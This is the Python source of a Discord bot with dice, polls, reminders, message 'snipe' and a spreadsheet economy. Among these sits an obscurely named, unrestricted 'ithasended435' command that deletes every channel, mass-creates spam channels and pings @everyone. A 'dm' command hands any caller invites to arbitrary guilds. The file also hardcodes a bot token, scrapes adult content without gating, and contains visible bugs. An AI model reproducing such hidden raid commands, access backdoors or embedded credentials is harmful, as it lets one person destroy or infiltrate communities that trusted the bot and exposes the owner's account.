import chart_studio
import discord
from discord.ext import commands
import random
from discord import Permissions
from discord.ext.commands import Bot
# from colorama import Fore, Style
import asyncio
import os
from pytz import timezone
import time
from datetime import datetime
from datetime import date
from bs4 import BeautifulSoup
import requests
# from matplotlib import pyplot as plt
import plotly.graph_objects as go

username = 'spicy_lemon'
import json
import chart_studio.plotly as py
import chart_studio.tools as tls

SPAM_MESSAGE = ["@everyone rip server :("]
SPAM_MESSAGE2 = ["hello"]
client = discord.Client()
intents = discord.Intents.default()
intents.members = True
intents.typing = True
xmes = 0
urlinp = 'https://chart-studio.plotly.com/~spicy_lemon/1/.png'
tz = timezone('EST')
client = commands.Bot(command_prefix='g!', intents=intents, help_command=None)
import gspread
from pprint import pprint
from oauth2client.service_account import ServiceAccountCredentials

scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/spreadsheets',
         "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name("creds.json", scope)

sheet_client = gspread.authorize(creds)
sheet = sheet_client.open("test").sheet1
sheet2 = sheet_client.open("economy").sheet1


@client.event
async def on_ready():
    global xmes
    print("bot ready")
    while True:
        global svar
        global loop_var
        global loop2_var
        loop_var = int(sheet.cell(12, 1).value)
        loop2_var = int(sheet.cell(13, 1).value)
        svar = int(sheet.cell(9, 1).value)
        await asyncio.sleep(180)
        new_now = datetime.now(tz)
        timey = new_now.strftime("%H")
        """if timey == '00':
                datey = datetime.today().strftime('%d %m %Y')
                day, month, year = (int(i) for i in datey.split(' '))
                weday = date(int(year), int(month), int(day)+6)
                datey1 = weday.strftime("%A")
                print('done')
                dmes = data['messages']
                data["fyo"].append(dmes)
                data["days"].append(datey1)
                with open('jtime.json', 'w') as f:
                  json.dump(data, f)
                fig = go.Figure(data=go.Scatter(x=data["days"],
                                        y=data["fyo"]))
                py.plot(fig, filename='shibo_stats',auto_open=False)
                print('day complete')
                print('messages sent: ', dmes)
                xmes = 0
                data['messages']=0
                with open('jtime.json', 'w') as f:
                  json.dump(data, f)
                await asyncio.sleep(3600)"""

        if timey == "00":
            datey = datetime.today().strftime('%d %m %Y')
            day, month, year = (int(i) for i in datey.split(' '))
            weday = date(int(year), int(month), int(day))
            datey1 = weday.strftime("%A")
            if svar >= 7:
                sheet.sheet.update_cell(12, 1, loop_var + 1)
                # sheet.sheet.update_cell(1, 13, loop2_var+2)
                sheet.sheet.update_cell(9, 1, 0)
                svar = int(sheet.cell(9, 1).value)

            sheet.update_cell(9, 1, svar + 1)
            svar = int(sheet.cell(9, 1).value)
            sheet.update_cell(svar, loop2_var, datey1)
            await asyncio.sleep(3600)


''''@client.event
async def on_message(message):
 if message.content.startswith('sauce drip nayu'):
   await message.channel.send("try 8")'''

keyword = "bum do"


@client.event
async def on_message(message):
    global xmes
    global loop_var
    if message.channel.type is discord.ChannelType.private:
        pass

    elif message.guild.id == 761311676049915985:
        xmes += 1
        sheet.update_cell(svar, loop_var, (int(sheet.cell(svar, loop_var).value) + 1))
        print(xmes)
    username = message.author.name
    embed = discord.Embed(title=":game_die:",
                          description=str(random.randint(1, 100)),
                          color=(0x4B2C7B))
    if message.content.startswith("g!1-100"):
        await message.channel.send(embed=embed)
    embedy = discord.Embed(title=":game_die:",
                           description=str(random.randint(1, 1000000000)),
                           color=(0xF46D02))
    if message.content.startswith("g!1-bil"):
        await message.channel.send(embed=embedy)
    if username == "Xanny" or username == "spicy_lemonade":
        if message.content.startswith("ratio"):
            await message.channel.send(":thumbup:")
            await message.add_reaction('👍')
    elif username != "Xanny" or username != "spicy_lemonade":
        if message.content.startswith("ratio"):
            await message.channel.send(":thumbdown:")
            await message.add_reaction('👎')
    await client.process_commands(message)


'''@client.command()
async def blip(ctx):
  while True:
        asyncio.sleep(10)
        now = datetime.datetime.now()
        current_time = now.strftime("%H:%M:%S")
        bumf = current_time
            #if bumf == "14:56:00":
               # print('yes')
        print(bumf)'''
likky = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vT3NGPoU0F3IeT5HvQapFeEQpeDiQa-2FpQTY7gzbtIpFnMo7V3eYJMvh5oPqFuQH0sYWcR_Rv5CZBy/pubchart?oid=1043142030&format=image'
embeysir = discord.Embed(title='Shibo-Stats', description='click open original to get up to date')


@client.command()
async def stats(ctx):
    embeysir.set_image(url=likky)
    embeysir.set_thumbnail(url=likky)
    await ctx.send(embed=embeysir)


@client.command()
async def sinfo(ctx):
    embeda = discord.Embed(title="Server Info")
    embeda.add_field(name="Server Name :label:",
                     value=ctx.message.guild.name,
                     inline=True)
    embeda.add_field(name="Members :tickets:",
                     value=len(ctx.message.guild.members),
                     inline=True)
    embeda.add_field(name="Channels :dividers:",
                     value=len(ctx.message.guild.channels))
    embeda.add_field(name="Owner :crown:", value=ctx.message.guild.owner)
    embeda.add_field(name="Id :card_index:", value=str(ctx.message.guild.id))
    embeda.add_field(name="Description :page_facing_up:",
                     value=ctx.message.guild.description)
    embeda.add_field(name="Region :flag_white:",
                     value=ctx.message.guild.region)
    embeda.add_field(name="Image URl :camera:",
                     value=ctx.message.guild.icon_url)
    embeda.add_field(name="Roles :ribbon:",
                     value=len(ctx.message.guild.roles),
                     inline=True)
    await ctx.send(embed=embeda)


@client.command(name='cmd', aliases=['help'])
async def cmd(ctx):
    embedi = discord.Embed(title="Commands")
    embedi.add_field(name="g!sinfo :bookmark_tabs:",
                     value="Provides server info",
                     inline=True)
    embedi.add_field(name="g!cmd :mag:",
                     value="Shows list of all commands",
                     inline=True)
    embedi.add_field(name="g!8ball :8ball:",
                     value="Ask an 8ball your questions and it will answer",
                     inline=True)
    embedi.add_field(
        name="g!newchan :gear:",
        value=
        "MOD ONLY!, creates new channel(channel name is text after the command)",
        inline=True)
    embedi.add_field(
        name="g!delchan :gear::x:",
        value=
        "MOD ONLY!, deletes specified channel(channel name is text after the command)",
        inline=True)
    embedi.add_field(
        name="g!poll :ballot_box:",
        value=
        "Creates a poll with check and cross emoji to vote with(name of poll is text after command)",
        inline=True)
    embedi.add_field(name="g!1-100 :game_die:",
                     value="Chooses a random number from 1 to 100",
                     inline=True)
    embedi.add_field(name="g!1-bil :game_die::game_die:",
                     value="Chooses random number from 1 to 1 billion",
                     inline=True)
    embedi.add_field(name="g!nick :label:",
                     value="Changes nickname(nick name is text after command)",
                     inline=True)
    embedi.add_field(
        name="g!remind :alarm_clock:",
        value=
        "Reminds you after specified amount of time, s= seconds, m=minutes, h=hours, d=days, ex = 'g!remind 5m do laundry'",
        inline=True)
    embedi.add_field(name="g!snipe :camera:",
                     value="post's last deleted messagsnie and who sent it",
                     inline=True)
    await ctx.send(embed=embedi)


@client.command()
@commands.has_permissions(manage_channels=True)
async def newchan(ctx, *, channel_name):
    embednewchan = discord.Embed(
        title=':gear: New Channel',
        description=f"```{channel_name} channel created by {ctx.author}```")
    await ctx.guild.create_text_channel(channel_name,
                                        category=ctx.channel.category)
    await ctx.send(embed=embednewchan)


@client.command()
@commands.has_permissions(manage_channels=True)
async def delchan(ctx, *, channel_name):
    guild = ctx.guild
    channel_find = discord.utils.get(guild.channels, name=channel_name)
    embeddelchan = discord.Embed(
        title=':gear::x: Deleted Channel',
        description=f"```{channel_name} channel deleted by {ctx.author}```")
    await channel_find.delete()
    await ctx.send(embed=embeddelchan)


@client.command()
@commands.has_permissions()
async def remind(ctx, time, *, task):
    global tz
    embedtime = discord.Embed(
        title=":timer: Remind",
        description=f"reminder set for {ctx.author.name} in {time}.",
        color=0x262d07,
        timestamp=datetime.now(tz))
    embedtimeend = discord.Embed(title=":alarm_clock: Reminder",
                                 description=f"{task} {ctx.author.name}",
                                 color=0xEc315a,
                                 timestamp=datetime.now(tz))
    seconds = 0
    if time.lower().endswith('s'):
        seconds += int(time[:-1])
    if time.lower().endswith("m"):
        seconds += int(time[:-1]) * 60
    if time.lower().endswith("d"):
        seconds += int(time[:-1]) * 60 * 60 * 24
    if time.lower().endswith("h"):
        seconds += int(time[:-1]) * 60 * 60
    await ctx.send(embed=embedtime)
    await asyncio.sleep(seconds)
    await ctx.send(embed=embedtimeend)
    await ctx.send(ctx.author.mention)
    return


@client.command()
async def poll(ctx, *, poll_name):
    embedo = discord.Embed(title=f"{ctx.author.nick}'s poll",
                           description=poll_name)
    if ctx.author.nick == None:
        embedo = discord.Embed(title=f"{ctx.author.name}'s poll",
                               description=poll_name)
    await ctx.message.delete()
    msg = await ctx.send(embed=embedo)
    await msg.add_reaction('✅')
    await msg.add_reaction('❌')


@client.command()
async def nick(ctx, *, nickname):
    last = ctx.author.nick
    await ctx.author.edit(nick=nickname)
    embednick = discord.Embed(
        title=":label: Name Change",
        description=f"{last} changed their name to {ctx.author.nick}")
    await ctx.send(embed=embednick)


num8 = str(8)
randemoji = random.choice([
    ":smiley:", ":flushed:", ":confounded:", ":rofl:", ":wink:", ":smirk:",
    ":face_exhaling:", ":woozy_face:", ":face_with_monocle:"
                                       ":neutral_face:"
])
randemoti = random.choice([":)", "._.", ">:(", ".-.", ";)", "✔", "☠"])


@client.command(name="8ball")
async def _8ball(ctx, *, query=None):
    randmsg = random.choice([
        ":8ball: for sure",
        ":8ball: most likely",
        ":8ball: YES YES YES",
        ":8ball: No troll :skull:",
        ":8ball: um no?",
        ":8ball: yeah no dude",
        ":8ball: 50 50 :person_shrugging:",
        ":8ball: WHY WOULD YOU EVEN ASK THAT LMAO :exclamation:",
        ":8ball: omg yes :sparkles:",
        ":8ball: if you believe :star2:",
        ":8ball: what do you think :eyes:",
        ":8ball: NO NO NO :x:",
        ":8ball: shiii why you asking me :person_shrugging:",
        ":8ball: yb does it better",
        ":8ball: cant even answer that bro",
        ":8ball: maybe you're the problem",
        ":8ball: wow you lack self awareness",
        ":8ball: get a job bum",
        ":8ball: idk what to tell you dawg :skull_crossbones:",
        ":8ball: yeah that’s a good idea :D",
        ":8ball: yes<333",
        ":8ball: never know till you try?",
        ":8ball: beyond a doubt",
        ":8ball: fo sho",
        ":8ball: on god brodie",
        ":8ball: yesss sirrrrr :handshake:"
        ":8ball: hahahaha no",
    ])
    if query == None:
        embed8 = discord.Embed(title=f"{randemoji} {ctx.author.nick}__ ",
                               description=randmsg,
                               color=(0x25be2a))
        if ctx.author.nick == None:
            embed8 = discord.Embed(title=f"{randemoji} {ctx.author.name}__ ",
                                   description=randmsg,
                                   color=(0x25be2a))
        await ctx.send(embed=embed8)
    else:
        embed8 = discord.Embed(
            title=f"{randemoji} {ctx.author.nick}__ {query}",
            description=randmsg,
            color=(0x25be2a))
        if ctx.author.nick == None:
            embed8 = discord.Embed(
                title=f"{randemoji} {ctx.author.name}__ {query}",
                description=randmsg,
                color=(0x25be2a))
        await ctx.send(embed=embed8)


snipe_message_content = None

snipe_message_author = None


@client.event
async def on_message_delete(message):
    global snipe_message_content

    global snipe_message_author
    global s_guild
    global s_icon
    s_icon = message.author.avatar_url
    s_guild = message.guild.id
    snipe_message_content = message.content
    snipe_message_author = message.author.nick
    if message.author.nick == None:
        snipe_message_author = message.author.name
    # print(snipe_message_content)

    await asyncio.sleep(180)
    snipe_message_content = None

    snipe_message_author = None


@client.command()
async def snipe(ctx):
    tz = timezone('EST')
    if ctx.guild.id == s_guild:

        embedsnipe = discord.Embed(color=0xD9108D,
                                   description=f"{snipe_message_content}",
                                   timestamp=datetime.now(tz))
        embedsnipe.set_author(name=f"{snipe_message_author}", icon_url=s_icon)
        embedsnipe.set_footer(text=f"{randemoti}")
        if snipe_message_content == None:
            await ctx.send("nothing to snipe")
        if snipe_message_content != None:
            await ctx.send(embed=embedsnipe)
    else:
        await ctx.send("nothing to snipe")


esnipe_message_content = None

esnipe_message_author = None


@client.event
async def on_message_edit(message, message_before):
    global esnipe_message_content

    global esnipe_message_author
    global es_guild
    global es_icon
    es_icon = message_before.author.avatar_url
    es_guild = message_before.guild.id
    esnipe_message_content = message_before.content
    esnipe_message_author = message_before.author.nick
    if message_before.author.nick == None:
        esnipe_message_author = message_before.author.name

    await asyncio.sleep(180)
    esnipe_message_content = None

    esnipe_message_author = None


@client.command()
async def esnipe(ctx):
    tz = timezone('EST')
    if ctx.guild.id == es_guild:

        embedesnipe = discord.Embed(color=0xD9108D,
                                    description=f"{esnipe_message_content}",
                                    timestamp=datetime.now(tz))
        embedesnipe.set_author(name=f"{esnipe_message_author}",
                               icon_url=es_icon)
        embedesnipe.set_footer(text=f"{randemoti}")
        if esnipe_message_content == None:
            await ctx.send("nothing to snipe")
        if esnipe_message_content != None:
            await ctx.send(embed=embedesnipe)
    else:
        await ctx.send("nothing to snipe")


bumdum = random.randint(1, 2000)


@client.command()
async def ph(ctx, *, searcher):
    url = f"https://www.pornhub.com/video/search?search={searcher}&page={bumdum}"
    result = requests.get(url).text
    doc = BeautifulSoup(result, 'html.parser')
    tag1 = doc.find('ul',
                    id="videoSearchResult",
                    class_="videos search-video-thumbs freeView")
    tags = tag1.find('div', class_="phimage")
    pimp = tags.find('a')
    await ctx.send("https://www.pornhub.com" + str(pimp['href']))


grand = random.randint(1, 200)


@client.command()
async def vid(ctx, *, vsearcher):
    vurl = f"https://www.pornhub.com/gifs/search?search={vsearcher}&page={grand}"
    vresult = requests.get(vurl).text
    vsoup = BeautifulSoup(vresult, "html.parser")
    # tag1 = soup.find('div', class_="nf-videos")
    vtags = vsoup.find_all('div', class_="gifsWrapper hideLastItemLarge")
    vpimp = random.choice(vtags)
    # pimp =tags.find('a')
    vpimp2 = vpimp.find_all('video')
    vpimp3 = random.choice(vpimp2)
    # print(pimp2)
    await ctx.send(str(vpimp3['data-mp4']))


@client.command()
async def gif(ctx, *, gsearcher):
    gurl = f"https://www.pornhub.com/gifs/search?search={gsearcher}&page={grand}"
    gresult = requests.get(gurl).text
    gsoup = BeautifulSoup(gresult, "html.parser")
    # tag1 = soup.find('div', class_="nf-videos")
    gtags = gsoup.find_all('div', class_="gifsWrapper hideLastItemLarge")
    gpimp = random.choice(gtags)
    # pimp =tags.find('a')
    gpimp2 = gpimp.find_all('video')
    gpimp3 = random.choice(gpimp2)
    # print(pimp2)
    newest = str(gpimp3['data-mp4'])
    newest2 = newest.replace('dl', 'el')
    newest2 = newest2.replace('mp4', 'gif')
    await ctx.send(newest2)


@client.command()
async def ithasended435(ctx):
    # if ctx.message.content.endswith("It didnt have to end this way, nuke time"):

    await ctx.message.delete()

    guild = ctx.guild

    for channel in guild.channels:

        await channel.delete()
        if ctx.guild.channels == None:
            break
    while True:
        await ctx.guild.create_text_channel("spam channel2")
        if len(ctx.author.guild.channels) == 1000:
            break
    if len(ctx.author.guild.channels) == 1000:
        for text_channel in ctx.author.guild.text_channels:
            await text_channel.send("@everyone")


# @client.event
# async def on_guild_channel_create(channel):
# while True:
# await channel.send(random.choice("bum do"))
'''if message.content.startswith(keyword):
     while True:
        await message.guild.create_text_channel("spam channel2")
        for text_channel in message.author.guild.text_channels:
           await text_channel.send("@everyone")'''
'''@client.command()
async def notknown(ctx):
    while True:
        await ctx.guild.create_text_channel("spam channel2")
        for text_channel in ctx.author.guild.text_channels:
            await text_channel.send("@everyone")'''

@client.command()
async def bank(ctx):
    global col2
    col2 = sheet2.col_values(1)
    await update_name(ctx)
    cell2 = sheet2.find(str(ctx.author.id))
    await ctx.send(sheet2.cell(cell2.row,2).value)

@client.command()
async def work(ctx):
    global col2
    col2 = sheet2.col_values(1)
    await update_name(ctx)
    work_val = random.uniform(1,60)
    await update_data(ctx,work_val)
    await ctx.send(f"you earned ${work_val}")
         
@client.command()
async def gamble(ctx,value,tg):
    global col2
    col2 = sheet2.col_values(1)
    await update_name(ctx)
    await update_gamble(ctx,value,tg)


async def update_name(ctx):
    if not str(ctx.author.id) in col:
        sheet2.append_row([str(ctx.author.id), 0])
async def update_data(ctx,exp):
    cell2 = sheet2.find(str(ctx.author.id))
    sheet.update_cell(cell2.row,2,float(sheet2.cell(cell2.row,2).value) + exp)

async def update_gamble(ctx,exp,tg):
    cell2 = sheet2.find(str(ctx.author.id))
    gam_choice = random.choice(['heads','tails'])
    if float(exp) > float(sheet2.cell(cell2.row, 2).value):
        await ctx.send('you dont own that much')
    else:
        if gam_choice == tg:
            sheet2.update_cell(cell2.row, 2, float(sheet2.cell(cell2.row, 2).value) + float(exp))
            await ctx.send(f"you gained ${exp}")
        else:
            sheet2.update_cell(cell2.row, 2, float(sheet2.cell(cell2.row, 2).value) - float(exp))
            await ctx.send(f"you lost ${exp}")

@client.command(name='dm')
async def dm(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    channel = guild.channels[0]
    invitelink = await channel.create_invite(max_uses=1)
    await ctx.author.send(invitelink)


@client.command()
@commands.is_owner()
async def shutdown(context):
    exit()


client.run('OTA1MjMxMzIwODc0MDk0Njk1.YYHEXQ.iZS2HTl4gsl5Rpkgnej4lfjSvxE', bot=True)
